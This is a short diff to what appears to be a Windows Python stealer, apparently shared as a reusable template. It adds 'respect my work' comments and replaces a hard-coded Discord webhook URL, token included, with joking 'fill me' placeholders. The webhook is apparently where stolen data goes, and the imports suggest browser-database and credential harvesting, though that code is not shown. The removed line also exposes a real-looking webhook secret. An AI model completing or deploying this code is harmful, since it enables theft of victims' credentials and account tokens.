@@ -1,3 +1,8 @@
+# Don't fuckin touch the profile pics i put @_@
+# respect my work !
+# That's the only rule and condition about this ^^
+
+
 import sys, os, ctypes, shutil, base64, sqlite3, zipfile, subprocess
 import platform as plt
 if os.name != "nt":
@@ -18,8 +23,8 @@ from threading import Thread
 from time import sleep
 from random import choice
 
-hook = Webhook("https://discord.com/api/webhooks/961650423226327101/uzyv2zmhvSmNDqFCG7VSKwncWgL2OPw9oaCnLCN3za8w2jthX-axZj2LvtyFr2W36cZU")
-whook = "https://discord.com/api/webhooks/961650423226327101/uzyv2zmhvSmNDqFCG7VSKwncWgL2OPw9oaCnLCN3za8w2jthX-axZj2LvtyFr2W36cZU"
+hook = Webhook("pls fill me 😔")
+whook = "fill me too daddy 🤤"
 
 languages = {
 	'da'    : 'Danish, Denmark',
